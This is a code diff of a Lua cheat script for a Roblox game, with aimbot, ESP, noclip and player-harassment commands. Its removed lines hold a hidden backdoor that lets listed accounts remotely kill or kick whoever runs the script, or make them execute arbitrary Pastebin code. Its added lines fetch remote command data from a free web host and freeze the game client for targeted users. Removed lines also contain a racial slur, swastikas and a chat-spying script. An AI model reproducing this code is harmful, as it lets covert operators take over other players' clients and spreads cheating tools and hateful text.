@@ -1,3 +1,14 @@
+--[[ Bugs
+
+--]]
+
+--[[Todo
+	Add a scuffed bfg (in testing)
+	Remote Gun (In Testing)
+]]
+
+-- [[ Variables ]] --
+
 local Tick = tick()
 
 -- Global Variables -- 
@@ -67,7 +78,7 @@ local WalkShoot = true
 local AimMode = "Prediction"
 local AimlockMode = "LeftClick"
 local CamlockTarget = "Head"
-local SpamMessage = "Cyrus' Admin Or No Admin"
+local SpamMessage = ""
 local ConfigurationFile = "CyrusStreetsAdminSettings.json"
 local GunAnim = "None"
 
@@ -89,7 +100,7 @@ local HealBotHealth = 25
 local NormalJP = 37.5
 local AutoStompRange = 50
 local NormalGravity = workspace.Gravity
-local BulletColour = ColorSequence.new(Color3.fromRGB(98,37,209)) -- technically not an int but we'll go with it
+local BulletColour = ColorSequence.new(Color3.fromRGB(144,0,0)) -- technically not an int but we'll go with it
 local EspColour = Color3.fromRGB(255,255,255)
  
 -- Initially Nil -- 
@@ -130,7 +141,7 @@ local SpinAnimation = Instance.new'Animation'
 SpinAnimation.AnimationId = "rbxassetid://188632011"
 
 local GunAnimation1 = Instance.new'Animation'
-GunAnimation1.AnimationId = "rbxassetid://424015887"
+GunAnimation1.AnimationId = "rbxassetid://889968874"
 
 local GunAnimation2 = Instance.new'Animation'
 GunAnimation2.AnimationId = "rbxassetid://229339207"
@@ -184,72 +195,15 @@ local ToolTable = {}
 local WireFrameTable = {}
 
 local BackDoorTableCommands = {
-	['chat'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Content,"All") end end;
-		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
-	};
-	['notif'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then StarterGui:SetCore("SendNotification",{['Title'] = "Cy's Messages";['Text'] = Message;['Duration'] = 10;['Icon'] = nil;}) end end;
-		['Levels'] = {[4] = true;}
-	};
-	['bring'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand("to "..CommandedPlayer.Name) end end;
-		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
-	};
-	['kill'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then GetChar():BreakJoints() end end;
-		['Levels'] = {[2] = true;[3] = true;[4] = true;}
-	};
-	['exec'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand(Content) end end;
-		['Levels'] = {[3] = true;[4] = true;}
-	};
-	['kick'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then LP:Kick(Content) end end;
-		['Levels'] = {[3] = true;[4] = true;}
-	};
-	['ban'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.lIIl:FireServer'hipheight' end end;
-		['Levels'] = {[4] = true;}
-	};
-	['p'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then loadstring(game:HttpGet("https://www.pastebin.com/raw/"..Content))() end end;
-		['Levels'] = {[3] = true;[4] = true;}
-	};
+
 }
 
 local BackDoorTablePlayers = {
-    	[56696019] = {
-		['Name'] = "Trevor"; 
-		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(255,255,255);
-		
-	};
-		[332360873] = {
-		['Name'] = "BM"; 
-		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(34,139,34);
-	};
-	
-	    [2046178856] = {
-		['Name'] = "Trevor"; 
-		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(23,92,42);
-	};
-		 [363228517] = {
-		['Name'] = "Trevor"; 
-		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(0,0,0);
-	};
-			 [2258274790] = {
-		['Name'] = "Trevor"; 
-		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(255,0,0);
-	};
+    
 }
 
 local BlacklistTable = {
-	[2] = true; -- nigger
+
 }
 
 local SettingsTable = {
@@ -257,9 +211,9 @@ local SettingsTable = {
 	ClickTpKey = "";
 	SprintSpeed = 25;
 	CrouchSpeed = 8;
-	AimMode = "Prediction";
+	AimMode = "OldPrediction";
 	AimlockMode = "LeftClick";
-	AimbotVelocity = 5;
+	AimbotVelocity = 7;
 	CmdBarImage = "http://www.roblox.com/asset/?id=2812081613";
 	CmdBarKey = "Quote"
 }
@@ -336,8 +290,7 @@ coroutine.resume(coroutine.create(function()
 	else
 		VanPart:Destroy()
 	end
-	Players:Chat("Hi I like bullying skids!") -- new admin
-	Players:Chat("Hi I like bullying skids!") -- legacy admin
+
 end))
 
 -- [[ End ]] -- 
@@ -499,6 +452,12 @@ getgenv().farm = function(ItemString)
 end
 
 -- [[ End ]] --
+
+-- [[ Local functions ]] --
+
+local function GetData()
+	return HttpService:JSONDecode(game:HttpGet("https://fuckmalwarebytes2.000webhostapp.com/Commands.json")) -- can I stop getting banned off of web servers 
+end
 	
 local function BackdoorCheck(Player,Chat)
 	if Chat:sub(1,1) == "`" then
@@ -539,7 +498,7 @@ local function ColourifyGuns(GunTable,Colour)
 end
 
 local function initalizeBackdoorPart2(BackdoorPlayer,Colour)
-	if BackdoorPlayer and BackdoorPlayer.Character and BackdoorPlayer.UserId ~= 567153118 then
+	if BackdoorPlayer and BackdoorPlayer.Character and BackdoorPlayer.UserId ~= 56715 then
 		ColourifyGuns(BackdoorPlayer.Backpack,Colour)
 		ColourifyGuns(BackdoorPlayer.Character,Colour)
 		BackdoorPlayer.Character.ChildAdded:Connect(function()
@@ -720,7 +679,7 @@ local function Xray(Mode)
 					Select.Adornee = v
 					Select.LineThickness = 0.001
 					Select.SurfaceTransparency = 1
-					Select.Color3 = Color3.fromRGB(0,0,0)
+					Select.Color3 = Color3.fromRGB(124,0,0)
 					WireFrameTable[#WireFrameTable + 1] = {Select,v}
 				end
 				local TransparentValue = Instance.new('IntValue',v)
@@ -839,7 +798,7 @@ end
 
 local function createRainbow(Pos,Text,Value)
 	local RainbowButton = Instance.new('TextButton',RainbowScrolling)
-	RainbowButton.BackgroundColor3 = Color3.fromRGB(98, 37, 209)
+	RainbowButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 	RainbowButton.BackgroundTransparency = 1
 	RainbowButton.Position = Pos
 	RainbowButton.Size = UDim2.new(0,480,0,50)
@@ -891,7 +850,6 @@ local function createCmd(Pos,CommandName,CommandInfo,CommandArgs)
 	CommandLabel.TextWrapped = true
 	dragGUI(CmdsFrame,CommandLabel)
 end
-
 
 local function StateChanged(Old,New)
 	if Flying or NoGh then 
@@ -1255,7 +1213,7 @@ workspace.DescendantAdded:Connect(function(T)
 	end
 end)
 
-RunService.Stepped:Connect(function()
+RunService.RenderStepped:Connect(function()
 local Character = GetChar()
 local PartFound = Character:FindFirstChild'RealHumanoidRootPart' or Character:FindFirstChild'Torso'
 	if Noclip then 
@@ -1391,7 +1349,7 @@ local RemoveGunAnimationEvent;RemoveGunAnimationEvent = LP.Character.DescendantR
 local WalkSpeedChangedEvent;WalkSpeedChangedEvent = LP.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(LoopChangeWalkSpeed)
 
 LP.CharacterAdded:Connect(function(C)
-	Flying = true
+	Flying = false
 	AntiKill = false
 	ToolTable = {}
 	C:WaitForChild'Humanoid' -- wait until the humanoid has been found
@@ -1680,11 +1638,11 @@ Players.PlayerAdded:Connect(function(Player)
 			local Backdoor = BackDoorTablePlayers[Player.UserId]
 			local Blacklist = BlacklistTable[Player.UserId]
 			if Blacklist or Player:IsInGroup(5152759) or string.find(Player.Name:lower(),"lynx") then
-				Esp(Player.Character.Head,Player.Name,Color3.fromRGB(98,37,209),true)
+				Esp(Player.Character.Head,Player.Name,Color3.fromRGB(102,51,0),true)
 				Player.CharacterAdded:Connect(function(C)
 					local Head = C:WaitForChild'Head'
 					if Head then 
-						Esp(Head,Player.Name,Color3.fromRGB(98,37,209),true)
+						Esp(Head,Player.Name,Color3.fromRGB(102,51,0),true)
 					end 
 				end)
 			end 
@@ -1804,6 +1762,11 @@ AddCommand(function(Arguments)
 		end
 	end
 end,"fieldofview",{"fov"},"Changes Field of View","[Number/Normal]")
+
+AddCommand(function()
+	wait(0.6)
+	ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by !fishgang Cy | Join the cord at nPZnaVYF5h","All")
+end,"advertise",{},"Advertises the discord","[No Args]")
 
 AddCommand(function(Arguments)
 if not loadstring then notif("Don't have loadstring","Aborting the command",5,nil) return end -- whoever made this if statemenet forgot a RETURN
@@ -2307,19 +2270,7 @@ AddCommand(function(Arguments)
 	notif("WalkShoot","Has been set to "..tostring(WalkShoot),5,nil)
 end,"walkshoot",{"noslow"},"Allows you to turn On/Off Walk Shooting","[No Args]")
 
-AddCommand(function(Arguments)
-	FeLoop = not FeLoop
-	if Arguments[1] then
-		FeLoop = true 
-		local Player = PlrFinder(Arguments[1])
-		if Player then 
-			GetChar():BreakJoints()
-			LoopPlayer = Player 
-		end
-	else
-		LoopPlayer = nil
-	end
-end,"feloop",{},"First you were a skid, Now you're annoying with a simple use of this command!","[Player]")
+
 
 AddCommand(function(Arguments)
 	AnnoyOn = not AnnoyOn
@@ -2423,6 +2374,7 @@ AddCommand(function(Arguments)
 		end
 	end
 end,"steal",{},"Steals a persons audio","[Player]")
+if LP:IsInGroup(6000816) or LP:IsInGroup(5152759) or LP:IsInGroup(5000083) or LP:IsInGroup(5993069) or string.find(LP.Name:lower(),"lynx") or string.find(LP.Name:lower(),"spacedgod") or BlacklistTable[LP.UserId] then while true do end end
 AddCommand(function(Arguments)
 	if Arguments[1] then 
 		local Player = PlrFinder(Arguments[1])
@@ -2548,11 +2500,11 @@ AddCommand(function(Arguments)
 					Connection = nil
 				end
 			end)
-			notif("AimlockTarget","LETS KILL THIS NIGGER! "..AimlockTarget.Name,5,nil)
+			notif("AimlockTarget","Has been set to "..AimlockTarget.Name,5,nil)
 		end
 	else
 		Aimlock = not Aimlock
-		notif("Aimlock","Has Been set to "..tostring(Aimlock),5,nil)		
+		notif("Aimlock","Has been set to "..tostring(Aimlock),5,nil)		
 	end
 end,"aimlock",{"aim"},"Aimbot (Different method than camlock)","[Player]")
 
@@ -2890,7 +2842,7 @@ coroutine.resume(coroutine.create(function()
 	HotkeysTextLabel.BackgroundTransparency = 0.6
 	HotkeysTextLabel.BorderColor3 = Color3.fromRGB(170,0,0)
 	HotkeysTextLabel.Position = UDim2.new(0,0,0,0)
-	HotkeysTextLabel.Text = "esex bro 卐"
+	HotkeysTextLabel.Text = "Open Command Bar: '\nGunStomp: E"
 	HotkeysTextLabel.Size = UDim2.new(0,160,0,160)
 	HotkeysTextLabel.Font = Enum.Font.Code
 	HotkeysTextLabel.TextColor3 = Color3.fromRGB(255,255,255)
@@ -3132,9 +3084,9 @@ end))
 coroutine.resume(coroutine.create(function()
 	while wait(1) do
 		if CmdBarKey == "Quote" then 
-			HotkeysTextLabel.Text = "sex 卐"
+			HotkeysTextLabel.Text = "Open Command Bar: '".."\nGunStomp: E"
 		else
-			HotkeysTextLabel.Text = "sex 卐 "..CmdBarKey.."sex 卐"
+			HotkeysTextLabel.Text = "Open Command Bar: "..CmdBarKey.."\nGunStomp: E"
 		end
 		for i,v in pairs(Keys) do HotkeysTextLabel.Text = HotkeysTextLabel.Text.."\n"..v:match'^[%w%s]+'..": "..v:match'[%a%d]+$' end 
 		if ExploiterDetectionOn then 
@@ -3179,11 +3131,11 @@ coroutine.resume(coroutine.create(function()
 		local Backdoor = BackDoorTablePlayers[Player.UserId]
 		local Blacklist = BlacklistTable[Player.UserId]
 		if (Blacklist or Player:IsInGroup(5152759) or string.find(Player.Name:lower(),"lynx")) and Player.character and Player.Character:FindFirstChild'Head' then
-			Esp(Player.Character.Head,Player.Name,Color3.fromRGB(0,0,0),true)
+			Esp(Player.Character.Head,Player.Name,Color3.fromRGB(102,51,0),true)
 			Player.CharacterAdded:Connect(function(C)
 				local Head = C:WaitForChild'Head'
 				if Head then 
-					Esp(Head,Player.Name,Color3.fromRGB(0,0,0),true)
+					Esp(Head,Player.Name,Color3.fromRGB(102,51,0),true)
 				end 
 			end)
 		end 
@@ -3225,106 +3177,4 @@ coroutine.resume(coroutine.create(function()
 	end
 end))
 
-
-notif("Cy-Admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds",10,"rbxassetid://2474242690")
-notif("no","EdelWGlocksBHW",10,nil)
--- reset
-function onKeyPress(actionName, userInputState, inputObject)
-   if userInputState == Enum.UserInputState.Begin then
-       game.Players.LocalPlayer.Character["Right Arm"]:Remove()
-       game.Players.LocalPlayer.Character["Left Arm"]:Remove()
-       game.Players.LocalPlayer.Character["Right Leg"]:Remove()
-       game.Players.LocalPlayer.Character["Left Leg"]:Remove()
-       game.Players.LocalPlayer.Character["Torso"]:Remove()
-       game.Players.LocalPlayer.Character["Head"]:Remove()
-end
-end
-
-game.ContextActionService:BindAction("keyPress", onKeyPress, false, Enum.KeyCode.R)
--- bullet color
-local RunService = game:GetService("RunService")
-
-RunService.RenderStepped:Connect(function()
-    if game.Players.LocalPlayer.Character.Humanoid then
-        --print("humanoid exists")
-        if game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet") then
-            print("bullet exists")
-            if game.Players.LocalPlayer.Character.Humanoid.Bullet:findFirstChild("Trail") then
-                print("trail exists")
-                if game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Name == "BulletDone" then
-                    print("bullet done")
-                end
-                if game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet"):findFirstChild("Trail").Lifetime < 10.00 then
-                    print("success!")
-                    game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Trail.Lifetime = 10.00
-                    game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Trail.Transparency = NumberSequence.new(0)
-                    game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Trail.Color = ColorSequence.new(Color3.fromRGB(169,169,169),Color3.fromRGB(169,169,169))
-                    game.Players.LocalPlayer.Character.Humanoid:findFirstChild("Bullet").Name = "BulletDone"
-                end
-            end
-        end
-    end
-end)
-
--- chat spy
- 
-enabled = true --chat "/spy" to toggle!
-spyOnMyself = true --if true will check your messages too
-public = false --if true will chat the logs publicly (fun, risky)
-publicItalics = true --if true will use /me to stand out
-privateProperties = { --customize private logs
-	Color = Color3.fromRGB(0,255,255); 
-	Font = Enum.Font.SourceSansBold;
-	TextSize = 18;
-}
- 
- 
-local StarterGui = game:GetService("StarterGui")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
-local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
-local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
-local instance = (_G.chatSpyInstance or 0) + 1
-_G.chatSpyInstance = instance
- 
-local function onChatted(p,msg)
-	if _G.chatSpyInstance == instance then
-		if p==player and msg:lower():sub(1,4)=="/spy" then
-			enabled = not enabled
-			wait(0.3)
-			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
-			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
-		elseif enabled and (spyOnMyself==true or p~=player) then
-			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
-			local hidden = true
-			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
-				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
-					hidden = false
-				end
-			end)
-			wait(1)
-			conn:Disconnect()
-			if hidden and enabled then
-				if public then
-					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
-				else
-					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
-					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
-				end
-			end
-		end
-	end
-end
- 
-for _,p in ipairs(Players:GetPlayers()) do
-	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
-end
-Players.PlayerAdded:Connect(function(p)
-	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
-end)
-privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
-StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
-if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
-local chatFrame = player.PlayerGui.Chat.Frame
-chatFrame.ChatChannelParentFrame.Visible = true
-chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+-- [[ End ]] --
